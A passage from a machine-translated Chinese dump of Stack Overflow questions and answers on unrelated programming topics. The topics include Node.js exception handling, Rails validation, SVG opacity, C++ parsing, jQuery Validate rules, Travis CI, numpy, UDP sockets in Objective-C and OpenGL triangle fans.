意外的异常是您需要担心的。如果您对应用程序的状态不够了解，无法添加对特定异常的处理并管理任何必要的状态清理，那么根据定义，您的应用程序的状态是未定义且不可知的，并且很可能存在一些事情不应该在附近闲逛。您需要担心的不仅仅是内存泄漏。未知的应用程序状态可能会导致不可预知的和不需要的应用程序行为（例如提供错误的输出——部分呈现的模板，或不完整的计算结果，或者更糟糕的是，每个后续输出都错误的情况）。这就是为什么在发生未处理的异常时退出进程很重要的原因。它使您的应用程序有机会自我修复。

发生异常，这很好。拥抱它。关闭该过程并使用[Forever](https://github.com/nodejitsu/forever)之类的东西来检测它并使事情重回正轨。集群和域也很棒。您正在阅读的文本并不是对抛出异常的警告，或者在您处理预期的异常时继续该过程 - 它是在发生意外异常时不要保持进程运行的警告。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-10T06:50:15.500

我认为当他们说“*我们正在泄漏资源*”时，他们的真正意思是“*我们**可能**正在泄漏资源*”。如果 http.createServer 适当地处理异常，线程和套接字不应该被泄露。但是，如果它不能正确处理事情，它们当然可能是这样。在一般情况下，您永远不会*真正*知道某些东西是否始终正确处理错误。

我认为当他们说“*由于 throw 在 JavaScript 中的工作原理，几乎没有任何方法可以安全地……* ”时，他们是错误的/非常具有误导性。不应该有任何关于 throw 在 Javascript（相对于其他语言）中如何使其不安全的事情。也没有关于 throw/catch 的一般工作方式使其不安全的任何内容 - 当然除非你错误地使用它们。

他们应该说的是，异常情况（无论是否使用异常）都需要妥善处理。有几个不同的类别需要识别：

一个状态

1.  外部状态（数据库写入、文件输出等）处于瞬态时发生的异常
2.  共享内存处于瞬态时发生的异常
3.  只有局部变量可能处于瞬态的异常

B. 可逆性

1.  可逆/可逆状态（例如数据库回滚）
2.  不可逆状态（丢失数据、未知如何反转或禁止反转）

C. 数据关键性

1.  数据可以报废
2.  必须使用数据（即使已损坏）

无论您正在搞乱哪种状态，如果您可以反转它，您应该这样做并且您已经设置好了。问题是不可逆的状态。如果您可以销毁损坏的数据（或将其隔离以单独检查），那是不可逆状态的最佳举措。当抛出异常时，本地变量会自动执行此操作，这就是为什么异常擅长处理纯函数式代码中的错误（即没有可能的副作用的函数）。同样，如果可以接受，则应删除任何共享状态或外部状态。在共享状态的情况下，要么抛出异常，直到该共享状态变为本地状态并通过展开堆栈（静态或通过 GC）来清理，要么重新启动程序（我读过有人建议使用某些东西永远喜欢nodejitsu）。

最后一种情况是数据至关重要的时候。好吧，那么你将不得不忍受你创造的错误。每个人都必须处理错误，但当您的错误涉及损坏的数据时，这是最糟糕的。这通常需要人工干预（重建丢失/损坏的数据，选择性地修剪等）——在最后一种情况下，异常处理不会让你全部完成。

我写了一个类似的答案，与如何在对某些数据存储进行多次更新的情况下在各种情况下处理中间操作失败有关：[https ://stackoverflow.com/a/28355495/122422](https://stackoverflow.com/a/28355495/122422)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-08T10:21:34.207

从 node.js 文档中获取示例：

```
var d = require('domain').create();
d.on('error', function(er) {
  // The error won't crash the process, but what it does is worse!
  // Though we've prevented abrupt process restarting, we are leaking
  // resources like crazy if this ever happens.
  // This is no better than process.on('uncaughtException')!
  console.log('error, but oh well', er.message);
});
d.run(function() {
  require('http').createServer(function(req, res) {
    handleRequest(req, res);
  }).listen(PORT);
}); 
```

`handleRequest`在这种情况下，当您关闭套接字之前发生异常时，您正在泄漏连接。

“泄漏”是指您完成了对请求的处理而没有事后清理。最终连接将超时并关闭套接字，但如果您的服务器处于高负载状态，它可能会在此之前用完套接字。

根据您所做的工作，`handleRequest`您还可能会泄漏文件句柄、数据库连接、事件侦听器等。

理想情况下，您应该处理您的异常，以便您可以在它们之后进行清理。

# ruby-on-rails - Rails - 保存前计数属性

> ID：15825755
> 
> 赞同：2
> 
> 时间：2013-04-05T04:07:22.200
> 
> 标签：ruby-on-rails, count

我有一个具有 :telephone 属性的类 aluno。我想将同一个电话号码限制在 3 次。:telephone 列中只能有 3 个电话号码。

在我创建一个新的 aluno 之前，我必须检查是否已经有 3 个 aluno 使用同一部电话。

这就像一个“SELECT count(telephone) FROM alunos where phone = '_FORM.telephone'

如果 count = 3 消息“已到达最多 3 部电话”

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:20:53.887

是的，您需要在模型中创建自定义验证器。它看起来像下面这样。

```
class Aluno < ActiveRecord::Base
  ...

  validate :there_are_three_max_telefone

  def there_are_three_max_telefone
    alunos = Aluno.find_all_by_telefone(telefone)
    if alunos.count >= 3
      errors[:base] << "Max 3 telefones already reached"
    end
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:25:13.280

你可以这样做：

```
a = alunos.find_all_by_telefone(params[:telefone])
if a.count >= 3:
   message = "Max reached"
else:
   entity.save 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:29:42.907

我将使用自定义方法进行此验证。像这样的东西应该进入你的 Aluno 模型。

```
validate :telefone_count

def telefone_count
  tele_count = Aluno.where(telefone: telefone).count
  if tele_count >= 3
    errors.add(:telefone, "Already 3 or more with the same telefone.")
  end
end 
```

# svg - SVG组的不透明度/半透明可以一起调整吗？

> ID：15825758
> 
> 赞同：15
> 
> 时间：2013-04-05T04:07:48.850
> 
> 标签：svg, transparency

我有一个包含多个组件的 SVG“g”对象。我想使整个事物部分透明（例如 alpha = 0.5），如果可能的话，我还想变暗。我知道可以调整单个填充颜色，但是将它们全部放在一起怎么样，可能在“g”（分组）结构的某些参数中。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-05T16:40:16.297

更改`opacity`（`<g>`通过`opacity="..."`属性或`opacity`CSS 规则）将导致组的内容首先被合成，然后结果的不透明度降低。请注意，这与降低组内所有元素的不透明度明显不同（您也可以通过 CSS 来实现）：

## 演示：http: [//jsfiddle.net/HZr7v/12/](http://jsfiddle.net/HZr7v/12/)

![在此处输入图像描述](https://i.stack.imgur.com/HIsUY.png)

使用这个 SVG：

```
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
    <defs><filter id="Darker">
      <feColorMatrix type="matrix" values="
       0.3  0   0   0   0
        0  0.3  0   0   0
        0   0  0.3  0   0
        0   0   0  0.8  0"/>
    </filter></defs>
    <g id="g1" transform="translate(60,60)"> <!-- top left -->
        <circle r="40" /><rect width="80" height="60" />
    </g>
    <g id="g2" transform="translate(220,60)"><!-- top right -->
        <circle r="40" /><rect width="80" height="60" />
    </g>
    <g id="g3" transform="translate(60,200)"><!-- bottom left -->
        <circle r="40" /><rect width="80" height="60" />
    </g>
    <g id="g4" transform="translate(220,200)"><!-- bottom right -->
        <circle r="40" /><rect width="80" height="60" />
    </g>
</svg> 
```

…使用这个 CSS：

```
circle { fill:red }
rect { fill:blue }

#g2 * { opacity:0.5 }         /* Change the opacity of each shape    */
#g3   { opacity:0.5 }         /* Change the opacity of the group     */
#g4   { filter:url(#Darker) } /* Darkens and drops opacity for group */ 
```

特别注意圆形和方形重叠的外观差异。

过滤器`feColorMatrix`看起来令人生畏。它所做的只是将 RGB 值设置为原始 RGB 的 30%（即更暗），并将 alpha 设置为原始 alpha 的 80%。更改您认为合适的值。

* * *

哦，如果你也想去饱和，你可以把它扔进过滤器（在变暗步骤之前或之后）：

```
<feColorMatrix type="saturate" values="0.5"/>
<!-- values="0"  will drop all color, leaving grayscale only -->
<!-- values="1"  will leave the current saturation color     -->
<!-- values="99" will super-saturate the colors              --> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T07:27:34.330

您可以在其本身上设置不透明度`<g>`，这将起作用。如果你想让它更暗，你可能需要对`<g>`沿着这些线的东西应用过滤器

```
 <filter id="Darker" filterUnits="objectBoundingBox" x="0" y="0" width="100%" height="100%">
      <feFlood in="SourceGraphic" flood-color="#0f0" flood-opacity="0.5" result="img2"/>
      <feBlend in="SourceGraphic" in2="img2" mode="darken"/>
    </filter> 
```

# c++ - 是否允许在 C++ 中实例化一个没有指定变量名的类

> ID：15825764
> 
> 赞同：4
> 
> 时间：2013-04-05T04:08:23.803
> 
> 标签：c++

我有这两个类：

```
class Foo
{
public:
      Foo() { std::cout << "in Foo constructor" << std::endl; }
};
class Bar
{
public:
    Bar() {};
    Bar(Foo foo);
private:
    Foo m_foo;
};

Bar::Bar(Foo foo) :
    m_foo(foo)
{
    std::cout << "in Bar constructor with argument Foo" << std::endl;
}

int main() {
    Bar bar(Foo()); // is something wrong here ?
    return 0;
} 
```

我编译并执行它，屏幕上没有打印，做了`Bar bar(Foo())`什么？我[在类型名称后的括号是否与新的不同？](https://stackoverflow.com/questions/620137/do-the-parentheses-after-the-type-name-make-a-difference-with-new) 和 [Foo f = Foo(); // 没有匹配的函数调用 'Foo::Foo(Foo)'](https://stackoverflow.com/questions/2776313/foo-f-foo-no-matching-function-for-call-to-foofoofoo-huh)，但我还是想不通。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:37:28.747

为了在不改变语义的情况下达到同样的效果（即[不使用复制或赋值构造函数](https://stackoverflow.com/questions/2462773/c-copy-construct-construct-and-assign-question)），请添加括号以消除语法歧义（编译器不知道您是在本地声明函数还是构建对象，默认情况下前者是由 C++ 标准优先）：

```
int main() {
    Bar bar ( (Foo()) );
    return 0;
} 
```

[正如评论中发布的维基百科页面](http://en.wikipedia.org/wiki/Most_vexing_parse)所指出的，这是 C++ 语法本身的问题，您对此无能为力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:26:00.547

好的，有人指出[编译器认为您正在声明一个函数](https://stackoverflow.com/questions/5926103/most-vexing-parsec#)。由**Pubby**和**Nbr44 提供**。这是一种绕过它的方法。只需让编译器知道您正在声明变量。

```
int main() {
    Bar bar = Foo();
    return 0;
} 
```

# image-processing - 如何找到某个 sigma 的（一维离散）高斯核的宽度？

> ID：15825766
> 
> 赞同：5
> 
> 时间：2013-04-05T04:08:42.817
> 
> 标签：image-processing, gaussian

是否有经验法则或数学方程式告诉我（一维离散）高斯内核对于某个 sigma 应该有多宽？

可以说，我选择 1.87 的 sigma，我的内核应该是 5 个值/步长/像素宽，7 还是 25，以便执行标准化的图像平滑处理？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:30:28.617

选择一个您认为可以忽略的阈值，例如`T = 0.01`. 然后解决`exp(-x^2/(2s^2)) / sqrt(2pi s^2) < T`：

`|x| < s sqrt(-2 ln(sqrt(2pi s^2) T))`

右侧为您提供宽度。对于`s = 1.87`和`T = 0.01`，这为您提供了 4 个像素的宽度。

# jquery - 禁用 jQuery 验证插件

> ID：15825768
> 
> 赞同：1
> 
> 时间：2013-04-05T04:08:51.703
> 
> 标签：jquery, ruby, jquery-validate, watir-webdriver

我正在使用 Web 驱动程序完成一个表单，并且需要通过`browser.execute_script()`将隐藏的表单字段插入 DOM 来绕过两个表单字段。

但是，我还需要禁用现有的验证方法才能提交表单。该表单使用 jQuery Validate。任何人都可以建议如何禁用部分或全部 jQuery Validate？

我尝试使用以下内容，但出现错误`TypeError: d is undefined`

```
b.execute_script('
    $("firstMemorableCharacter").rules("remove");
    $("secondMemorableCharacter").rules("remove");
') 
```

`firstMemorableCharacter`附有验证规则的表单字段的名称在哪里。

使用 jQuery Validate 设置验证，如下所示：

```
with($.validator) {
    addMethod(...);

setDefaults({
    ....
    messages: { },
    rules: {
            firstMemorableCharacter: {
                radioHasValue: true
            },
            secondMemorableCharacter: {
                radioHasValue: true
            }
    }
}); 
```

（上面显示的规则是我需要禁用的规则。）

提前致谢。

更新：

在这篇文章之后，[如何从表单中删除 jQuery 验证？](https://stackoverflow.com/questions/363268/how-do-i-remove-jquery-validation-from-a-form)，我尝试使用 HTML DOM（绕过 jQuery）提交表单，使用`$("#form-id")[0].submit();`. 但是，这不起作用 - jQuery 中似乎有一些额外的 JavaScript 需要执行才能正确提交表单。

因此，我需要一种在 jQuery Validate 中专门禁用这两个规则的方法，而不是禁用整个 jQuery 或 jQuery Validate。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T14:28:44.190

> 任何人都可以建议如何禁用部分或全部 JQuery Validator？

一旦初始化，您就不能禁用它的任何部分。但是，您可以使用您已经猜到[的`.rules()`方法](http://docs.jquery.com/Plugins/Validation/rules#.22add.22rules)动态地操作规则。

只需确保在 某个时间*之后*`.rules()`调用该方法，否则它将失败。 *`.validate()`*

 ***看这个简单的演示：http: [//jsfiddle.net/qdjMS/](http://jsfiddle.net/qdjMS/)**

* * *

下面的代码中存在语法错误。

```
$("firstMemorableCharacter").rules("remove");
$("secondMemorableCharacter").rules("remove"); 
```

请注意，您的两个 jQuery 选择器毫无意义。

如果你试图定位一个`id`，那么你需要一个`#`在前面...

```
$("#firstMemorableCharacter").rules("remove");
$("#secondMemorableCharacter").rules("remove"); 
```

从您的评论中，我还注意到您的元素包含`id="firstMemorableCharacter1"`，因此您还需要拼写`id`完全相同...

```
$("#firstMemorableCharacter1").rules("remove"); 
```

否则，您可以将它们`name`作为目标，如[我的演示](http://jsfiddle.net/qdjMS/)中所示...

```
$("[name='firstMemorableCharacter']").rules("remove");
$("[name='secondMemorableCharacter']").rules("remove"); 
```*

# github - Github 拉取请求“好合并”

> ID：15825770
> 
> 赞同：11
> 
> 时间：2013-04-05T04:09:29.180
> 
> 标签：github, travis-ci

在 Github 上，我注意到一些拉取请求说它们“适合合并”，因为它们已经通过了[Travis](http://travis-ci.org)构建。我用过一点 Travis，它是如何与 Github 上的拉取请求集成的？

这是我正在谈论的屏幕截图：

![Github 好合并](https://i.stack.imgur.com/f6vu6.png)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-05T04:41:47.450

一旦你设置好 Travis 并告诉它需要测试哪个分支，它会自动在每个针对其中一个分支的拉取请求上运行构建（以及每个提交到这些分支的提交）。

请注意，Github 上的 Travis 通知仅在构建/测试结束后（大约 15 分钟）才会出现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-04T00:03:44.607

此外，这不是 Travis 特定的。Github 有一个用于持续集成的 API，适用于 TravisCI，也适用于 CircleCI。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-09T07:43:18.600

请注意，自 2014 年 12 月 8 日起，您可以在拉取请求中看到来自*多个服务的**多个*状态。

 *## 查看所有拉取请求状态检查的结果

> 自从我们引入 Status API 以来，您已经能够通过在每次推送的对话时间线中包含拉取请求的状态来提高代码质量。
> **在今天之前，您只能看到一项服务的结果。现在，您可以一次查看所有结果，从针对不同平台测试您的代码的多个 CI 系统到同时进行的安全测试和代码覆盖率分析**。

![https://cloud.githubusercontent.com/assets/483/5332863/0f58f9b6-7e1a-11e4-9884-e362ec566f2b.png](https://i.stack.imgur.com/Kueuk.png)

> 您还可以通过单击单个提交旁边列出的图标来查看拉取请求的状态在其历史记录中的变化情况。

![https://cloud.githubusercontent.com/assets/483/5324992/9caa6820-7c96-11e4-81cc-36bb8287e63d.png](https://i.stack.imgur.com/mqbKi.png)

* * *

自 2015 年 7 月 20 日起，该状态信息将在 PR 中清晰可见。

请参阅“[更清晰的合并请求信息](https://github.com/blog/2040-clearer-mergability-information-for-pull-requests)”：

![https://cloud.githubusercontent.com/assets/6104/8488265/6356866a-20df-11e5-8f56-43a55cc04c43.png](https://i.stack.imgur.com/1QpqG.png)

> 每个月，GitHub 上的 119,000 个存储库使用自动状态检查（通过**[GitHub 状态 API](https://developer.github.com/v3/repos/statuses/)**），并且以易于理解的方式呈现这些信息非常重要。
> 
> 当您准备好合并拉取请求时，您应该能够看到它已准备就绪。
> 如果检查没有通过，您应该能够看到原因。*

# python - 2D Numpy Array 初学者的烦恼

> ID：15825773
> 
> 赞同：2
> 
> 时间：2013-04-05T04:09:58.797
> 
> 标签：python, arrays, numpy, multidimensional-array

我的问题是尝试使用每个元素都是 2 个值的元组的数组。

具体来说，问题是生成一个 200 步（但用于测试说 2）步的随机二维步行，最大距离，然后每个阶段 100 步（仅尝试 2 步），并从距前一阶段的起源。

我可以成功生成随机步骤数组并让它们返回最终位置 (x,y) 值，并计算它们与每次步行原点的距离：

这是在这些函数中定义的：

```
#............................................................getPositionInteger
def getPosInt(description) :
    """Asks the user to enter a positive integer"""
    askAgain = False
    while askAgain == False:
        try:
            posInt = eval(raw_input("\n %s :  " %description))
            assert 0 < posInt , "Not a positive integer"
            assert type(posInt) == int , "Not a positive integer"
            askAgain = True
        except :
            print "Input failed, not a positive integer"
    return posInt
#...............................................................initialPosition
def initialPosition() :
    """Initial position of walker at the start of a random walk"""
    return (0.0, 0.0)

#......................................................................distance
def distance(posA, posB) :
    """Distance between two positions"""
    xi = posA[0] ; yi = posA[1]
    xf = posB[0] ; yf = posB[1]
    return np.sqrt((xf-xi)**2+(yf-yi)**2)

    #..................................................................getPositions
def getPositions(start, nSteps, maxStep):
    xArray = maxStep * np.random.random(nSteps+1)* np.cos(2.0 * np.pi * random.random())
    yArray = maxStep * np.random.random(nSteps+1)* np.sin(2.0 * np.pi * random.random())
    xArray[0] = start[0]
    yArray[0] = start[-1]
    xArray = np.cumsum(xArray)
    yArray = np.cumsum(yArray)                                                    
    return (xArray[-1], yArray[-1]) 
```

但是我无法以每个阶段的 (x,y) 形式获得每个阶段每个步行的最终位置的数组

这是主要脚本以及我遇到问题的地方：

```
import numpy as np
import matplotlib.pylab as plt
import random
import time

MAX_STEP_SIZE = 0.90    # maximum size of a single step [m]
random.seed(12345)

#..........................................................................main
def main ():
    ''''''
    print "RANDOM WALK IN STAGES IN TWO DIMENSIONS"
    userdata = getDetails()
    print "\nPlease wait while random walks are generated and analyzed..."
    NUM_STAGES = userdata[0]
    NUM_WALKS = userdata[1]
    NUM_STEPS = userdata[2]
    stageStart = initialPosition()
    for stage in np.arange(NUM_STAGES):
        walks = np.zeros((NUM_WALKS, NUM_WALKS), dtype=np.ndarray)
        for walk in walks:
            walk = getPositions(stageStart, NUM_STEPS, MAX_STEP_SIZE)
            print walk
        print walks 
```

您会看到我在制作 (x,y) 样式数组时遇到了麻烦，其中 [0 0] 应该是 [0.0 , 0.0] 并且打印了两次，此外，它不会更改为最终位置。

我非常感谢您提供的帮助、建议或参考资料。谢谢-席德

# c# - 用新值替换部分字符串

> ID：15825774
> 
> 赞同：-3
> 
> 时间：2013-04-05T04:10:01.167
> 
> 标签：c#

我有一个场景，其中我需要用新文本替换字符串文字。

例如，如果我的字符串是“01HW128120”，我将首先检查文本是否包含“01HW”，如果是，则将其替换为字符串“MachineID-”。

所以最终我希望“01HW128120”成为“MachineID-128120”。有时我确实将字符串设为“1001HW128120” - 在这种情况下，我还需要将“1001HW”替换为“MachineID-”我尝试了下面的代码片段，但这并不符合我的预期。

```
string sampleText = "01HW128120";
if(sampleText.Contains("01HW"))
  sampleText = sampleText.Replace("01HW","MachineID-"); 
```

任何建议都会对我有很大帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:27:39.663

## 很少有可能的搜索值

如果只有几种可能的组合，您可以简单地进行多次测试：

```
string value = "01HW128120";
string replacement = "MachineID-";

if( value.Contains( "01HW" ) ) {
    value = value.Replace( "01HW", replacement );
}
else if( value.Contains( "1001HW" ) ) {
    value = value.Replace( "1001HW", replacement );
}

Assert.AreEqual( "MachineID-128120", value ); 
```

## 许多可能的搜索值

当然，如果您有大量的可能性，这种方法很快就会变得笨拙。另一种方法是将所有搜索字符串保存在一个列表中。

```
string value = "01HW128120";
string replacement = "MachineID-";

var tokens = new List<string> {
    "01HW", 
    "1001HW"

    // n number of potential search strings here
};

foreach( string token in tokens ) {
    if( value.Contains( token ) ) {
        value = value.Replace( token, replacement );
        break;
    }
} 
```

## “更智能”的匹配

如果您有可管理数量的搜索字符串，但您可能需要不完全匹配、不区分大小写、环顾四周或捕获值以插入被替换的字符串，则正则表达式非常适合字符串替换。

一个非常简单的正则表达式，满足您的要求：`1001HW|01HW`.

演示：[http ://regexr.com?34djm](http://regexr.com?34djm)

一个稍微聪明的正则表达式：`^\d{2,4}HW`

*   在字符串开头断言位置
*   匹配 2-4 位数字
*   从字面上匹配值“HW”

另请参阅：[Regex.Replace 方法](http://msdn.microsoft.com/en-us/library/xwewhkd1.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:41:38.373

如果您只想将所有内容替换为`"01HW"`，`"MachineID-"`则可以使用通用正则表达式：

```
sampleText = Regex.Replace(sampleText, "^.*01HW", "MachineID-"); 
```

# ios - UIActivityViewController 通过电子邮件共享图像没有扩展

> ID：15825777
> 
> 赞同：6
> 
> 时间：2013-04-05T04:10:28.057
> 
> 标签：ios, cocoa-touch

附加的图像只是“Attachment-1”，没有扩展名。我如何指定一个？

```
 NSData *compressedImage = UIImageJPEGRepresentation(self.resultImage, 0.8 );

    UIActivityViewController *activityViewController = [[UIActivityViewController alloc] initWithActivityItems:@[ @"Check this out!", compressedImage ] applicationActivities:nil];

    [self.navigationController presentViewController:activityViewController animated:YES completion:nil]; 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-05T05:34:17.847

根据[此答案](https://stackoverflow.com/a/13028336/846273)，您应该可以使用此解决方法来指定文件名

```
NSData *compressedImage = UIImageJPEGRepresentation(self.resultImage, 0.8 );
NSString *docsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
NSString *imagePath = [docsPath stringByAppendingPathComponent:@"image.jpg"];
NSURL *imageUrl     = [NSURL fileURLWithPath:imagePath];

[compressedImage writeToURL:imageUrl atomically:YES]; // save the file
UIActivityViewController *activityViewController = [[UIActivityViewController alloc] initWithActivityItems:@[ @"Check this out!", imageUrl ] applicationActivities:nil]; 
```

这种方法的明显缺点是您必须将图像保存在磁盘上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-25T16:28:33.600

归功于 timeuser 的建议，将 UIImage 转换为 NSData。

```
NSData * data = UIImageJPEGRepresentation(original,1.0);
UIActivityViewController * activity =[[UIActivityViewController alloc] initWithActivityItems:@[@"Your Text", data] applicationActivities:nil];
[self presentViewController:activity animated:true completion:^{ }]; 
```

# java - 打印子串

> ID：15825781
> 
> 赞同：0
> 
> 时间：2013-04-05T04:11:23.750
> 
> 标签：java, string

但是，我也打印出单词的所有子字符串；我无法获得最后的输出。

```
import java.util.Scanner;

public class printer {
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        System.out.println("Enter a word");
        String s = scan.nextLine();
        int i;
        int j;
        for (i=1; i<s.length(); i++) {
            for (j=0; j+i<=s.length(); j++) {
                String ss = s.substring(j, j+i);
                System.out.println(ss);
        } }
    }
} 
```

输入

```
thunder 
```

输出

```
t
h
u
n
d
e
r
th
hu
un
nd
de
er
thu
hun
und
nde
der
thun
hund
unde
nder
thunde
hunder
(missing thunder) 
```

当然我只是放了一个 System.out.println(s); 最后，但我希望它以 for 循环结束

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T04:14:01.393

将您的外部 for 循环条件更改为`i<=s.length`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-05T04:14:27.023

`for`将您的第一个循环中的检查更改为`i`：-

```
for (i = 1; i <= s.length(); i++) // "i" should be less than or equal to the length of "s" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T04:16:31.560

您需要获取 i=s.length(); 的值

只需将外循环设为`for(i=1; i<=s.length(); i++)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T04:17:47.300

作出修正

```
for (i=1; i<s.length(); i++)

to 
for (i=1; i<=s.length(); i++) 
```

# javascript - 用户在网页上滚动后将类添加到标记

> ID：15825782
> 
> 赞同：-2
> 
> 时间：2013-04-05T04:11:25.277
> 
> 标签：javascript, jquery

我有一个网页，当用户在任何时候滚动时，我想要一个 div 标签将其类从“顶部”更改为“顶部滚动”。

我认为您必须使用 .scrollTop() 来执行此操作，但不太确定如何使用它。这是html代码

```
<div class="thetop">
        <?php /** Begin Header **/ if ($gantry->countModules('header')) : ?>
        <div id="rt-header">
           <div class="rt-container">
             <?php echo $gantry->displayModules('header','standard','standard'); ?>
             <div class="clear"></div>
           </div>
         </div>
         <?php /** End Header **/ endif; ?>
     </div> 
```

在用户滚动以应用单独的 css 样式后，我还想在 body 标记中包含名为“scrolled”的类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:19:24.300

是的，您可以使用[ScrollTop](http://api.jquery.com/scrollTop/)功能。

你可以像这样在身体上使用它：

```
$('body').scrollTop(); 
```

它将返回滚动的像素数。

假设您想在滚动 500 像素后添加一个类：

```
$('body').scroll(function(){
    // This function will be called at each scroll event
    if($('body').scrollTop()>=500){
        $('.thetop').removeClass('thetop').addClass('thetopscrolled');
        $('body').unbind(); // You don't want to add the class at each scroll event, just once.
    }
}); 
```

# objective-c - 在Objective C中发送UDP数据包：数据包到达时没有任何数据

> ID：15825787
> 
> 赞同：0
> 
> 时间：2013-04-05T04:11:41.733
> 
> 标签：objective-c, udp

我正在尝试在目标 C 中发送 UDP 数据包。更具体地说，使用针对 iphone 6.1 模拟器的 xcode 进行构建。

我似乎无法真正收到我发送的数据。奇怪的是，我确实收到了一个数据事件......数据刚刚被截断为长度 0。

我已经尽可能地减少它，做一个我认为应该通过的简单测试。

```
#import "UdpSocketTest.h"
#include <arpa/inet.h>
#import <CoreFoundation/CFSocket.h>
#include <sys/socket.h>
#include <netinet/in.h>

@implementation UdpSocketTest

static int receivedByteCount = 0;
void onReceive(CFSocketRef socket, CFSocketCallBackType type, CFDataRef address, const void *data, void *info);
void onReceive(CFSocketRef socket, CFSocketCallBackType type, CFDataRef address, const void *data, void *info) {
    // this gets called once, but CFDataGetLength(data) == 0
    receivedByteCount += CFDataGetLength(data);
}

-(void) testUdpSocket {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_len = sizeof(addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5000); // <-- doesn't really matter, not sending from receiver
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    CFSocketContext socketContext = { 0, (__bridge void*)self, CFRetain, CFRelease, NULL };

    // prepare receiver
    CFSocketRef receiver = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_DGRAM, IPPROTO_UDP ,kCFSocketDataCallBack, (CFSocketCallBack)onReceive, &socketContext);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), CFSocketCreateRunLoopSource(NULL, receiver, 0), kCFRunLoopCommonModes);
    CFSocketConnectToAddress(receiver, CFDataCreate(NULL, (unsigned char *)&addr, sizeof(addr)), -1);

    // point sender at receiver
    CFSocketRef sender = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_DGRAM, IPPROTO_UDP, kCFSocketDataCallBack, (CFSocketCallBack)onReceive, &socketContext);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), CFSocketCreateRunLoopSource(NULL, sender, 0), kCFRunLoopCommonModes);
    CFSocketConnectToAddress(sender, CFSocketCopyAddress(receiver), -1);

    // send data of sixty zeroes, allow processing to occur
    CFSocketSendData(sender, NULL, (__bridge CFDataRef)[NSMutableData dataWithLength:60], 2.0);
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];

    // did the data arrive?
    STAssertTrue(receivedByteCount > 0, @"");
    // nope
}
@end 
```

我究竟做错了什么？我知道这很明显，但我看不到。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:32:59.970

我很惊讶你收到任何回调——你从来没有真正将你的接收器绑定到你的本地端口。您正在创建两个套接字并告诉他们“我去发送数据到`127.0.0.1:5000`”，但是您没有说“我想在`127.0.0.1:5000`.

为此，您应该调用[`CFSocketSetAddress`](https://developer.apple.com/library/mac/#documentation/CoreFOundation/Reference/CFSocketRef/Reference/reference.html)接收器套接字，*而不是* `CFSocketConnectToAddress`. 这相当于[`bind(2)`](http://developer.apple.com/library/ios/#documentation/system/conceptual/manpages_iphoneos/man2/bind.2.html)在底层原生 BSD 套接字上调用系统调用。

# android - OpenGL ES使用TRIANGLE_FAN退化三角形？

> ID：15825796
> 
> 赞同：1
> 
> 时间：2013-04-05T04:13:33.653
> 
> 标签：android, performance, opengl-es

在 OpenGL ES 中，是否可以使用退化三角形（面积为 0 的三角形）来分隔顶点数组中的 TRIANGLE_FAN 对象？还是只有 TRIANGLE_STRIP 才能做到这一点？

如果答案是否定的，将多个 TRIANGLE_FAN 顶点数组绘制调用批处理为一个的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T18:14:12.497

你是对的，答案是否定的，因为所有三角形扇形三角形共享相同的顶点。

如果您想批量处理多个三角形风扇，最好使用[顶点缓冲区对象](http://www.opengl.org/wiki/VBO#Vertex_Buffer_Object)`GL_TRIANGLES`或带模式的 VBO 。会有一个小的索引缓冲区开销，但它会提供更好的灵活性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-17T21:48:34.620

您还可以将您的表面三角测量为条带而不是扇形。它将允许您使用退化三角形并将您的绘制调用批处理为一个。

如果您的表面是 n 边形，这很容易。只需更改顶点创建的顺序。与其绕着中心走，不如选择一个顶点开始并通过在两侧迭代来生成其他顶点。这是一个[Hexagon](http://www.drking.org.uk/hexagons/flexagons/tp6.gif)的例子。左图使用三角条，中图使用扇形。

# java - Servlet 和 JSP 中的会话管理

> ID：15825807
> 
> 赞同：2
> 
> 时间：2013-04-05T04:14:56.480
> 
> 标签：java, jsp, authentication, servlets, servlet-filters

如何在项目中的所有 servlet 和 JSP 中使用会话？

